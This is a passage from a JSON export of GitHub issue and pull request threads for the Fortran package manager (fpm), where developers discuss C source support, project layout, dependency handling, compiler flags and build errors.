                    "date": "2020-05-13 16:26:15+00:00",
                    "text": "I don't foresee issues with building C alongside Fortran. It may be even simpler as there are no modules to deal with."
                },
                {
                    "user": "certik",
                    "date": "2020-05-13 16:35:13+00:00",
                    "text": "Regarding C support: a full solution there is this: mamba-org/mamba#223.\nWhat we could do for fpm is not the full solution, but provide functionality for simple C source files, not full packages with a complicated build system.\nWe have to decide on a layout for C sources:\n\n\nShould the .c files be simply files in src/ folder? (I vote yes.)\n\n\nWhere should the header files be? Either in src/ or in include/.\n\n\nWhat about dependencies and their header files? (I would suggest Conda and that you can use anything from there, so fpm will create an internal environment and you can use any header file from there.)\n\n\nWhat about linking of dependencies?\n\n\nGiven that we will support C, why not C++ also? Supporting C++ would be very useful to provide Fortran wrappers: we would write a simple C wrapper that calls into a 3rd party C++ library, and call that C wrapper from Fortran, so it requires compiling of a C++ code.\n\n\nAlso one needs to link libc properly for C, and libc++ properly for C++. I think we have to do this anyway anytime we depend on a C or C++ library.\n\n\nThere will be more issues. Some of them similar to what we have to deal with anyway for Fortran sources. So I think let's keep this option open when we are designing fpm, although I still suggest to concentrate on Fortran sources first."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-13 17:24:18+00:00",
                    "text": "The low hanging fruit here seems to be handling the mixed C and Fortran source in a single project.\nJust let .c and .h sit in src/ by default, use gcc by default (like we do now with gfortran), link all object files into a static library and executable (like we do now).\nLinking to external (binary) dependencies seems orthogonal to this. Nevertheless important, but we could tackle these incrementally."
                },
                {
                    "user": "pdebuyl",
                    "date": "2020-05-13 20:47:04+00:00",
                    "text": "I had in mind the \"simple\" use case of one or a few c files that indeed \"just get compiled\" as part of the Fortran module. Making the shared C libraries available to other Fortran \"consumer code\" is probably out of scope. Anyway, thank you for the replies :-)"
                },
                {
                    "user": "certik",
                    "date": "2020-05-13 21:40:36+00:00",
                    "text": "@pdebuyl thanks for bringing it up, I think we can do that. Looking at my own code here: https://github.com/certik/hfsolver/tree/master/src, I have .f90 files, .c and .h files and also .cpp files all in the src directory. So if fpm could eventually compile all that correctly, that would go a long way. The reason I have the C and C++ files are just to interface 3rd party libraries, typically there is no way around that, as one must write some simpler wrapper that is ready to be called from Fortran using the iso_c_binding interface.\nSo I like this."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 21:44:48+00:00",
                    "text": "The Fortran fpm version does support compiling C code and we can link against native libraries already. I'll close this issue as resolved for now."
                }
            ]
        },
        {
            "number": 67,
            "user": "everythingfunctional",
            "date": "2020-04-30 03:21:47+00:00",
            "title": "Add sections to PACKAGING.md on explicit fpm.toml and tests",
            "text": "Add a couple of sections to the PACKAGING.md file and some other minor fixes.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-04-30 15:41:51+00:00",
                    "text": "I played with fpm finally, and it works well. This is how I was imagining it would work. Obviously it is still a prototype, but a usable one. Thank you @everythingfunctional for putting all the effort there! I really appreciate it.\nI think we need a mailinglist, for a general discussion. @milancurcic how about we create a fortran-lang mailinglist and simply see how it goes? We can always close it if it does not work out."
                }
            ]
        },
        {
            "number": 66,
            "user": "LKedward",
            "date": "2020-04-29 15:12:24+00:00",
            "title": "Support multiple compilers side-by-side in build",
            "text": "Currently compiled binaries are placed in build/debug/ and build/release.\nWould it be possible to make this build path dependent on compiler (and maybe architecture)?\ne.g. build/gfortran-9.2.0-x86_64_debug/\nThis reason for this being that I like to build and test my projects on multiple compilers during development; separating the binary output paths allows incremental builds using multiple compilers and allows tests on each compiler to run simultaneously and without clean and rebuild.\nThis may be considered an 'ugly' directory structure, however since fpm handles all compiler/linker paths and offers the fpm run command, this has no effect on end-user experience.\nThe workflow for using a non-default compiler could then be along the lines of:\n$> export FC=ifort\n$> fpm run\n\nor\n$> FC=ifort fpm run\n\nor\n$> fpm run --compiler=ifort",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 15:51:56+00:00",
                    "text": "Yeah, this shouldn't be too difficult. Good idea."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 21:33:44+00:00",
                    "text": "This has been resolved with #255 in Fortran fpm and #220 in the Haskell version."
                }
            ]
        },
        {
            "number": 65,
            "user": "milancurcic",
            "date": "2020-04-29 14:45:54+00:00",
            "title": "How to build multiple programs?",
            "text": "Currently, FPM can build only one executable program, namely main.f90.\nHere's how Cargo does it:\n.\n\u251c\u2500\u2500 Cargo.lock\n\u251c\u2500\u2500 Cargo.toml\n\u251c\u2500\u2500 src/\n\u2502   \u251c\u2500\u2500 lib.rs\n\u2502   \u251c\u2500\u2500 main.rs\n\u2502   \u2514\u2500\u2500 bin/\n\u2502       \u251c\u2500\u2500 named-executable.rs\n\u2502       \u251c\u2500\u2500 another-executable.rs\n\u2502       \u2514\u2500\u2500 multi-file-executable/\n\u2502           \u251c\u2500\u2500 main.rs\n\u2502           \u2514\u2500\u2500 some_module.rs\n\u251c\u2500\u2500 benches/\n\u2502   \u251c\u2500\u2500 large-input.rs\n\u2502   \u2514\u2500\u2500 multi-file-bench/\n\u2502       \u251c\u2500\u2500 main.rs\n\u2502       \u2514\u2500\u2500 bench_module.rs\n\u251c\u2500\u2500 examples/\n\u2502   \u251c\u2500\u2500 simple.rs\n\u2502   \u2514\u2500\u2500 multi-file-example/\n\u2502       \u251c\u2500\u2500 main.rs\n\u2502       \u2514\u2500\u2500 ex_module.rs\n\u2514\u2500\u2500 tests/\n    \u251c\u2500\u2500 some-integration-tests.rs\n    \u2514\u2500\u2500 multi-file-test/\n        \u251c\u2500\u2500 main.rs\n        \u2514\u2500\u2500 test_module.rs\n\nSo, for Fortran, the main executable could be src/main.f90, and other executables could go in src/bin.\nI like this approach, and I am not married to this particular directory structure. I also like the structure that we have now, namely app/, src/, tests/.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 15:57:27+00:00",
                    "text": "Right now, if you want multiple executables you have to specify them manually. I'm open to enabling some auto-detection of multiple executables. I'll put together an outline of what that would look like."
                },
                {
                    "user": "certik",
                    "date": "2020-04-29 16:28:46+00:00",
                    "text": "I like the Cargo layout a lot. Brad, is there a reason to use app? I would switch to src/bin to be consistent with Cargo.\n\u2026\nOn Wed, Apr 29, 2020, at 8:46 AM, Milan Curcic wrote:\n\n\n Currently, FPM can build only one executable program, namely `main.f90`.\n\n Here's how Cargo\n <https://doc.rust-lang.org/cargo/guide/project-layout.html> does it:\n\n `.\n \u251c\u2500\u2500 Cargo.lock\n \u251c\u2500\u2500 Cargo.toml\n \u251c\u2500\u2500 src/\n \u2502   \u251c\u2500\u2500 lib.rs\n \u2502   \u251c\u2500\u2500 main.rs\n \u2502   \u2514\u2500\u2500 bin/\n \u2502       \u251c\u2500\u2500 named-executable.rs\n \u2502       \u251c\u2500\u2500 another-executable.rs\n \u2502       \u2514\u2500\u2500 multi-file-executable/\n \u2502           \u251c\u2500\u2500 main.rs\n \u2502           \u2514\u2500\u2500 some_module.rs\n \u251c\u2500\u2500 benches/\n \u2502   \u251c\u2500\u2500 large-input.rs\n \u2502   \u2514\u2500\u2500 multi-file-bench/\n \u2502       \u251c\u2500\u2500 main.rs\n \u2502       \u2514\u2500\u2500 bench_module.rs\n \u251c\u2500\u2500 examples/\n \u2502   \u251c\u2500\u2500 simple.rs\n \u2502   \u2514\u2500\u2500 multi-file-example/\n \u2502       \u251c\u2500\u2500 main.rs\n \u2502       \u2514\u2500\u2500 ex_module.rs\n \u2514\u2500\u2500 tests/\n     \u251c\u2500\u2500 some-integration-tests.rs\n     \u2514\u2500\u2500 multi-file-test/\n         \u251c\u2500\u2500 main.rs\n         \u2514\u2500\u2500 test_module.rs\n `\n So, for Fortran, the main executable could be `src/main.f90`, and other\n executables could go in `src/bin`.\n\n I like this approach, and I am not married to this particular directory\n structure. I also like the structure that we have now, namely `app/`,\n `src/`, `tests/`.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#65>, or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWEWB2SGOZD73V6TTXTRPA4TFANCNFSM4MTZD3CQ>."
                },
                {
                    "user": "LKedward",
                    "date": "2020-04-29 16:34:11+00:00",
                    "text": "I actually much prefer app to src/bin. In my mind a bin directory is for binary files only, not source code."
                },
                {
                    "user": "certik",
                    "date": "2020-04-29 16:54:16+00:00",
                    "text": "Ok. Well, let's at least evaluate the options how to structure the layout with pros / cons. Because once we pick one, it will be hard to change.\n\u2026\nOn Wed, Apr 29, 2020, at 10:34 AM, LKedward wrote:\n\n\n I actually much prefer `app` to `src/bin`. In my mind a `bin` directory\n is for binary files only, not source code.\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#65 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWCPT6UMT3RKJ6WRDJ3RPBJJFANCNFSM4MTZD3CQ>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 17:28:53+00:00",
                    "text": "The app, src separation makes it much easier to determine what should be packaged up into the library, and what is just for use in executable(s). I also makes finding the executable(s) a bit simpler for the automatically detected case. If we switch to the src/bin approach I'll need to special case out of searching that directory when building the library."
                },
                {
                    "user": "certik",
                    "date": "2020-04-29 17:59:54+00:00",
                    "text": "I see, good point. Are we still doing src/main.f90 to mean an executable? If so, then you have to special case this anyway."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-29 18:13:31+00:00",
                    "text": "I think we should aim to minimize special cases in the UI, and implement accordingly. A good test for this is asking what design leads to the simplest user guide.\nFor example, if everything in src is considered a library component except src/main.f90 and src/bin/*.f90, then these are special cases that require additional clauses in the documentation.\nOn the other hand, app for programs and src for library is simplest to explain to a user, and is currently my favorite solution.\nAn even simpler UI than this (to explain to a user) is to have program files be programs, and module files be modules, regardless of where they are in the tree. However this complicates implementation because now fpm needs to parse the sources. A downside is that now there may not be clear separation between programs and module files if the user is just looking at the source tree. However if you have app and src, it's clear.\nWe should study Rust+Cargo model in detail, but we shouldn't assume that it's the optimal solution for us. This could be because of Rust's own history of the project, or because Rust and Fortran are different languages and have different cultures.\nI agree with @LKedward about app vs bin."
                },
                {
                    "user": "certik",
                    "date": "2020-04-29 18:27:07+00:00",
                    "text": "Good points. Note that fpm has to parse the sources anyway to determine module dependencies and to enforce that each module name is named appropriately.\nSo looks like the most natural solution so far is:\n\nsrc contains module files (or loose procedures / function --- we should not encourage it, but some existing projects do that and I think we can incorporate this without harm). Everything in src gets built into a library.\napp, contains programs. Perhaps app/main.f90 could be the main program (by default executed by fpm run).\ntests contains tests\nbench contains benchmarks (we can do this one later perhaps --- although most of my projects contain some kind of benchmarks which are distinct from apps and distinct from tests)"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 21:41:54+00:00",
                    "text": "I see, good point. Are we still doing src/main.f90 to mean an executable? If so, then you have to special case this anyway.\n\nNo, I didn't implement src/main.f90 to be an executable. If it sees that it will expect it to be a module named main."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-28 10:24:55+00:00",
                    "text": "Closing as this is now implemented."
                }
            ]
        },
        {
            "number": 64,
            "user": "milancurcic",
            "date": "2020-04-29 14:38:17+00:00",
            "title": "fpm run and fpm test should emit a message if no action is taken",
            "text": "Currently, if you issue fpm run in a library project without executable program, it does nothing.\nIt'd be more user friendly if we emitted a message to stderr, something like:\nfpm: This package has no executable programs.\n\nor similar.\nLikewise for fpm test. If there are no test, we should say something like:\nfpm: This package has no tests.\n\nWhat do you think?",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 14:39:43+00:00",
                    "text": "Not a bad idea. Shouldn't be too difficult to implement."
                }
            ]
        },
        {
            "number": 63,
            "user": "milancurcic",
            "date": "2020-04-29 14:34:01+00:00",
            "title": "Don't require compiler field in fpm.toml",
            "text": "Following up on the discussion in #60, let's remove the requirement for the compiler setting in the package-specific fpm.toml.\nFor now, FPM should default to gfortran, and we can put a note in the README or the packaging guide that gfortran is currently the only compiler supported. We can relax this at a later time. The compiler setting can still remain in the toml parser as optional--perhaps we will want to allow package-specific choice of compiler.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 14:41:04+00:00",
                    "text": "That's reasonable for now. I'll make that change on my PR"
                }
            ]
        },
        {
            "number": 62,
            "user": "everythingfunctional",
            "date": "2020-04-29 02:55:30+00:00",
            "title": "Handling Dependencies",
            "text": "My basic outline of how to do this is the following recursive algorithm:\n\nfor each listed dependency, download/check it out\nGo into the dependency's fpm.toml file and for each of it's dependencies\na. if it's already been downloaded, check that it's version is compatible, otherwise recursively repeat this process\nCollect each of the dependencies dependencies,\nReturn the tree of dependencies\nBuild each of the dependencies, recursively building each of it's dependencies first",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 02:58:57+00:00",
                    "text": "I should be able to implement this soon. I'll use a similar toml specification style as Rust's cargo. I got sidetracked implementing the ability to parse that properly for the toml parser we're using.\nWhich brings up a question. Do we specify the specific git version of that library as one of our dependencies, or do we include the functions I implemented directly in our source? For either, at some point we'll be able to remove it and go back to using the library as normal."
                },
                {
                    "user": "LKedward",
                    "date": "2020-04-29 08:17:58+00:00",
                    "text": "Thanks @everythingfunctional, this will be great to get working! I have a few questions:\n\nAt this stage are dependencies simply specified directly as git repository urls (#33 decentralized package management)?\nAre you using git tags to track specific versions in git repositories?\nHow are dependency versions specified in fpm.toml? (cargo supports several version operators)\nAre you adopting some form of semantic versioning rules to resolve version compatibility?\n\nAlso: surely you can only resolve compatible dependency versions after the entire dependency tree has been constructed?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 14:30:29+00:00",
                    "text": "For now, we'll just support git repository urls, since we don't have a centralized repo yet.\nJust like cargo does, we'll support tags, commits, or branches being specified for a git dependency.\nI'm planning to implement version specifications exactly like cargo does. That's a bit longer term goal though.\nYes, we'll adopt semantic versioning rules. Long term, it may even be possible to enforce those rules in a centralized repository.\nIn the short term, we won't \"resolve\" dependency versions. It will just check if the version already downloaded is compatible with the package's requirements. If not we'll just throw an error. You can then \"resolve\" the conflict by specifying a version that works for all the dependencies in your package. I don't know of any package manager that has really and truly solved the version compatibility search problem. Many have just reasonable approximations or workarounds."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-28 10:24:11+00:00",
                    "text": "Closing as implemented in both versions of fpm."
                }
            ]
        },
        {
            "number": 61,
            "user": "milancurcic",
            "date": "2020-04-28 20:52:11+00:00",
            "title": "add license",
            "text": "FPM needs a license.\nMIT seems a no-brainer here, but need permission from contributors.",
            "comments": []
        },
        {
            "number": 60,
            "user": "milancurcic",
            "date": "2020-04-28 20:47:08+00:00",
            "title": "Package layout guide",
            "text": "First stab at describing package layout and examples.\nI took the user guide approach rather than a specification document because:\n\nIt's impossible to separate package layout specification (output of tree) and fpm.toml specification; they are interdependent;\nIt's impossible to predict the exact specification that we'll need; in other words, we need to work up to it;\nBy writing this out as a user guide, I had to learn it enough to teach it. This process illustrates what's missing and what's working or not working. We should take it step by step from there.\nWe want users to try to adapt their package to FPM and open issues with what doesn't work or is unclear.\n\nPlease read it and let me know any suggestions, or edit the document directly.\nYou'll see that I asked one question and proposed two issue candidates in quotation blocks (>). We should remove them and open issues before merging this.\nEverything covered in the guide works with current master of FPM, except a few details about fpm.toml settings that aren't implemented.\nI also need to say, even at this early and raw stage it's pleasure using FPM. Doing something like this with Fortran code is already pushing the boundary. So, great work @everythingfunctional and @certik.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-04-28 21:06:59+00:00",
                    "text": "Thanks @milancurcic for writing a tutorial for this. Very helpful. It looks great overall and I don't have any issues with it, except one big one: I strongly feel we should not be encoding compiler options into fpm.toml and so we should not be encouraging users to do so. In the same way, we should not be encoding standard layout into fpm.toml either. FPM should allow both as an option, but by default it would do the right thing.\nSo in particular, none of this should be there:\ncompiler = \"gfortran\"\ndevel-options = [\"-g\", \"-Wall\", \"-Wextra\", \"-pedantic\"]\nrelease-options = [\"-O3\"]\n\n[executables.executable-name]\nmain = \"main.f90\"\nsource-dirs = \"app\"\nlinker-options = [\"-O3\"]\n\nThis should be all inferred automatically. Exactly as Cargo works.\nI think fpm might not be able to do it yet. That is fine, but in that case I would like to see very clearly stated that this is temporary and show how the fpm.toml will look like once we implement this."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-28 21:31:39+00:00",
                    "text": "@certik I agree. What I think makes most sense is:\n\nfpm has default behavior baked in\n(optional) compiler can be changed on fpm level (not the package level)\n(optional) some packages may need to override default compiler flags, but I assume this is minority of packages.\n\nIt turns out, right now fpm doesn't require any of this except compiler. So even for the last example, this is a valid fpm.toml:\nname = \"math_constants\"\nversion = \"0.1.0\"\nlicense = \"MIT\"\nauthor = \"Jane Programmer\"\nmaintainer = \"jane@example.com\"\ncopyright = \"2020 Jane Programmer\"\ndependencies = []\ncompiler = \"gfortran\"\nSo I can go right ahead and remove the other settings from examples. That will also make the tutorial simpler.\nAs for the compiler setting, it seems like it would be straighforward for @everythingfunctional to hardcode it for now. I think that's a reasonable temporary solution."
                },
                {
                    "user": "certik",
                    "date": "2020-04-28 21:56:15+00:00",
                    "text": "fpm can optionally allow setting the compiler + options both at the package level (fpm.toml) as well as the fpm level (command line options / configure file such as ~/.fpmconfig).\nIdeally most packages will not specify either, just use the default as in your tutorial (I agree we should remove the gfortran that is currently still hardwired in fpm.toml even though clearly those examples would compile with any Fortran compiler). That way getting all packages working with a new compiler (say Flang or LFortran later on) would be trivial --- just add support for those compilers into fpm.\nOnly packages that truly require some special handling in compilers should do so --- and even then we should try to see what special handling they require. I've seen that some old f77 code requires the -std=legacy gfortran option. In that case I would suggest to not make them gfortran specific, but rather introduce a legacy=true fpm option (or in this case std=f77, std=f2018, ...), that would (in principle) work with any Fortran compiler and fpm would figure out what options must be set for each compiler."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 02:16:23+00:00",
                    "text": "This looks really good. I haven't read all the way through it yet, but I did notice a few inconsistencies with how I actually finished implementing all the toml options. I suggest we go ahead and merge this though, and then I'll fix any inconsistencies on my branch before we merge it. I should be able to do that within the next few days.\nI'll note that while in my implementation the compiler flags are hard coded, the compiler actually isn't. I suspect in the short term we'll pick different hard coded flags based on the compiler specified, and long term we'll come up with a compiler agnostic way of specifying special flags needed for a given project."
                }
            ]
        },
        {
            "number": 59,
            "user": "milancurcic",
            "date": "2020-04-26 18:46:49+00:00",
            "title": "remove -Werror gfortran flag",
            "text": "Fixes #56",
            "comments": []
        },
        {
            "number": 58,
            "user": "milancurcic",
            "date": "2020-04-26 18:44:47+00:00",
            "title": "Update readme and executable name",
            "text": "This PR:\n\nUpdates install instructions in the README and adds instructions on how to use fpm.\nRenames FPM executable from fpm-exe to fpm.\n\nFixes #55",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-04-28 21:56:01+00:00",
                    "text": "@certik Does this look good? It's a simple PR."
                }
            ]
        },
        {
            "number": 57,
            "user": "milancurcic",
            "date": "2020-04-26 18:18:15+00:00",
            "title": "fpm assumes .mod has the same name as the source file",
            "text": "If I have a source file datetime.f90 that contains a module called datetime_module, then gfortran (and all other compilers I believe) output datetime_module.mod. However, fpm expects datetime.mod and can't find it.\nI believe the assumption about .mod filename comes from somewhere around here, however I don't have a solution right now.\nI think the safe assumption is that the .mod file will have the module name, for fpm will need to scan the source file to get this info.\nFurther, a source file can have multiple modules defined, and for each the compiler will emit one .mod file.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-26 21:06:21+00:00",
                    "text": "That assumption actually comes from here.\nThe reasoning is that we want the file name to match the module name, and the module name to include the path components of the file name. This was a basic structure to help with organizing modules that @certik and I came up with.\nThere are ways to just inspect the source files and figure out the module names and dependencies more flexibly, but for our initial implementation we wanted to keep things as simple as possible and try and encourage a common organizational convention.\nObviously this is something that should be added to the README. @certik , do you think you'll have time to write up our standard conventions in the README any time soon?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-26 21:27:04+00:00",
                    "text": "Specifically for datetime-fortran, that's fine. I'm happy to rename the source file so it can build with fpm.\nI also support encouraging the practice one module per source file, with file name matching the module.\nHowever, I think this may be quite limiting if fpm is to build existing packages. I don't know, but it's possible that there are many that have multiple modules per source file.\nThis made me think now: why would there be an expectation for a specific .mod file to be present? AFAIK, the compiler cares only about the include path and that the modules are there. It knows how to find the file in the include directory. So, this requirement by fpm seems artificial to me. Could it be removed so that fpm only checks for .o files? I think it's safe to assume that if .o file is created, that the .mod files have been created as well."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-26 21:28:26+00:00",
                    "text": "However, I think this may be quite limiting if fpm is to build existing packages. I don't know, but it's possible that there are many that have multiple modules per source file.\n\nRelated to this, I think more problematic is that this requirement would prevent fpm from building correct and modern Fortran code."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-27 04:22:28+00:00",
                    "text": "It's more about rebuilds. If you change a module and rebuild, then if the .mod file changes, you need to rebuild everything that depends on it."
                },
                {
                    "user": "certik",
                    "date": "2020-04-27 05:12:55+00:00",
                    "text": "Yes, the default layout restricts what can be done, and you want that. It's not meant as a replacement for cmake, which allows you to do anything, but you pay for it by maintaining a complex buildsystem. We want to rather create a convention, that would allow fpm to figure out everything by itself.\n\nFor existing packages we either have to adapt them, or we need to tell fpm extra information where things are.\n\u2026\nOn Sun, Apr 26, 2020, at 10:22 PM, Brad Richardson wrote:\n\n\n It's more about rebuilds. If you change a module and rebuild, then if\n the .mod file changes, you need to rebuild everything that depends on\n it.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#57 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWBXBCUBJJZTLO54K4LROUCBBANCNFSM4MRK6V2A>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-27 12:27:17+00:00",
                    "text": "Okay, sounds good. We can revisit if it shows to be an issue, I don't think it is right now.\nYes, it'd be good to discuss and write out requirements for packages. I don't remember seeing this specific one anywhere."
                },
                {
                    "user": "certik",
                    "date": "2020-04-27 15:58:24+00:00",
                    "text": "@milancurcic see #39."
                }
            ]
        },
        {
            "number": 56,
            "user": "milancurcic",
            "date": "2020-04-26 17:59:16+00:00",
            "title": "Correct code fails to build due to hardcoded -Werror",
            "text": "fpm is currently making gfortran fail on warning by hardcoding -Werror. Removing -Werror from fpm.toml doesn't change this behavior (I understand specifying flags via fpm.toml may not be implemented yet.\nHowever, in the meantime, we shouldn't use -Werror because it's making correct code to fail. For example:\n[milan@gary test_project_error]$ cat src/mylib.f90 \nreal :: a, b\na = 2.\nb = 2.\nprint *, a == b\nend\n[milan@gary test_project_error]$ cat fpm.toml \nname = \"package-name\"\nversion = \"0.1.0\"\nlicense = \"BSD3\"\nauthor = \"Author name here\"\nmaintainer = \"example@example.com\"\ncopyright = \"2020 Author name here\"\ndependencies = []\ncompiler = \"gfortran\"\ndevel-options = [\"-g\", \"-Wall\", \"-Wextra\", \"-pedantic\"]\nrelease-options = [\"-O3\"]\n\n[library]\nsource-dirs = \"src\"\n[milan@gary test_project_error]$ fpm build\n# gfortran (for build/debug/library/mylib.o build/debug/library/mylib.mod)\nsrc/mylib.f90:4:8:\n\n print *, a == b\n        1\nError: Equality comparison for REAL(4) at (1) [-Werror=compare-reals]\nf951: all warnings being treated as errors\nfpm-exe: Error when running Shake build system:\n  at want, called at src/Build.hs:188:11 in fpm-0.1.0.0-9zFE4ut013U9YSOSmXT3I3:Build\n* Depends on: build/debug/library/package-name.a\n  at need, called at src/Build.hs:186:13 in fpm-0.1.0.0-9zFE4ut013U9YSOSmXT3I3:Build\n* Depends on: build/debug/library/mylib.o\n  at &%>, called at src/Build.hs:166:11 in fpm-0.1.0.0-9zFE4ut013U9YSOSmXT3I3:Build\n* Depends on: build/debug/library/mylib.o build/debug/library/mylib.mod\n  at cmd, called at src/Build.hs:179:19 in fpm-0.1.0.0-9zFE4ut013U9YSOSmXT3I3:Build\n* Raised the exception:\nDevelopment.Shake.cmd, system command failed\nCommand line: gfortran -c -Jbuild/debug/library -Wall -Wextra -Wimplicit-interface -Werror -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -o build/debug/library/mylib.o src/mylib.f90\nExit code: 1\nStderr:\nsrc/mylib.f90:4:8:\n\n print *, a == b\n        1\nError: Equality comparison for REAL(4) at (1) [-Werror=compare-reals]\nf951: all warnings being treated as errors\n\nWhat do you think?",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-04-26 18:15:42+00:00",
                    "text": "I think Werror is not your friend and should not be used here; especially here where we cannot guarantee a specific compiler version.\nLatest gfortran actually produces spurious warnings for certain derived-type allocations so Werror would completely prevent you from producing a debug build.\n#50"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-26 21:15:52+00:00",
                    "text": "As I mentioned on the PR, I'm fine with removing the -Werror flag from the default list. But in this instance I will point out that comparison of reals really is a bad idea. Floating point math means that equality will almost surely never be true. For example, I'm pretty sure (1.0 / 3.0) == ((1.0 / 9.0) * 3.0) is false, when you really would expect it to be true."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-26 21:35:26+00:00",
                    "text": "In most cases, yes, and that's why there should be a warning for it. :)"
                }
            ]
        },
        {
            "number": 55,
            "user": "milancurcic",
            "date": "2020-04-25 17:52:58+00:00",
            "title": "stack build does not add fpm executable to path",
            "text": "First time running stack. On running stack build, it looks like the fpm executable is not installed in any working path. I expected it to be installed either somewhere under stack like pip does, or locally and then added to my path.\nFor example, I'm working in /home/milan/Work/fortran/fpm, fpm-exe is installed here: /home/milan/Work/fortran/fpm/.stack-work/install/x86_64-linux-tinfo6/68e6a00e61079ec9146947ae047a1ce619d26ace12c1e4cd5fd58ceb496743b0/8.6.5/bin\nso I had to add this to my PATH.\nIs this expected behavior? If not, is this an issue with stack or with fpm?\nfpm-exe should be called just fpm.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-26 17:20:18+00:00",
                    "text": "stack build is not supposed to install the executable. I'll have to try it, but I believe stack install will do what you are after. I think it typically will install it to $HOME/.local/bin."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-26 18:58:34+00:00",
                    "text": "Thanks, I tested stack install and it works."
                }
            ]
        },
        {
            "number": 54,
            "user": "everythingfunctional",
            "date": "2020-04-14 00:37:36+00:00",
            "title": "Additional testing",
            "text": "Set up and test some example projects",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-22 02:46:11+00:00",
                    "text": "I think this is now sufficient for any project, with no dependencies, on any platform. But please feel free to put it through the ringer and let me know if you find anything."
                },
                {
                    "user": "certik",
                    "date": "2020-04-22 03:54:13+00:00",
                    "text": "Thanks @everythingfunctional. I'll test it out soon. I was really busy with other things lately."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-26 19:00:58+00:00",
                    "text": "I just noticed this didn't make it to master yet. I will play with it. So far I worked only with current master."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-26 23:29:17+00:00",
                    "text": "@certik , do you want a chance to test it out, or should I go ahead and merge this?"
                }
            ]
        },
        {
            "number": 53,
            "user": "everythingfunctional",
            "date": "2020-04-11 22:45:31+00:00",
            "title": "Finish commands",
            "text": "Finish the required functionality for a project with no dependencies.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-12 05:15:52+00:00",
                    "text": "Yeah, we should test a variety of setups, with default settings, specified default settings, and non-default settings. I guess my next steps should be to come up those examples."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-13 02:47:40+00:00",
                    "text": "@milancurcic , absolutely."
                },
                {
                    "user": "certik",
                    "date": "2020-04-13 17:40:38+00:00",
                    "text": "Thanks @everythingfunctional for working on this. It's quite difficult for me to contribute to the Haskell code base, as I am still learning it, but I'll be able to greatly help with the test cases --- if you provide some initial tests, I'll submit PRs with more tests."
                }
            ]
        },
        {
            "number": 52,
            "user": "everythingfunctional",
            "date": "2020-04-11 21:46:12+00:00",
            "title": "Finish simple project settings",
            "text": "This finishes up all the necessary settings for a basic simple project",
            "comments": []
        },
        {
            "number": 51,
            "user": "everythingfunctional",
            "date": "2020-03-31 20:50:29+00:00",
            "title": "Two stage settings",
            "text": "This splits the settings for FPM into a two stage process and starts to make use of that for default behavior",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-31 20:53:18+00:00",
                    "text": "The architecture is starting to come together and look reasonable so far. No major changes should be needed from this point to support all 3 commands for a project with no dependencies. I think that will be my next step after this."
                },
                {
                    "user": "certik",
                    "date": "2020-04-04 16:19:42+00:00",
                    "text": "Yes, our goal should be that fpm packages work with all compilers by default. My experience is with larger Fortran codes that they typically work with a few particular compilers but not all, e.g., one of our codes works with Intel and NAG, but not gfortran. I don't know if it makes sense to allow fpm packages to restrict which compilers it works with. But for now I would simply allow all.\n\u2026\nOn Sat, Apr 4, 2020, at 9:33 AM, Milan Curcic wrote:\n\n\n ***@***.**** approved this pull request.\n\n \ud83d\udc4d\n\n Should the compiler choice (e.g. gfortran) be set in fpm.toml? It seems\n to me more appropriate to be a local fpm setting and not a package\n setting. It's okay here for now, just a note for later.\n\n \u2014\n You are receiving this because your review was requested.\n Reply to this email directly, view it on GitHub\n <#51 (review)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AAAFAWHLSETPQZ5T3WR6ILLRK5HNLANCNFSM4LX72EBA>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-04 17:17:08+00:00",
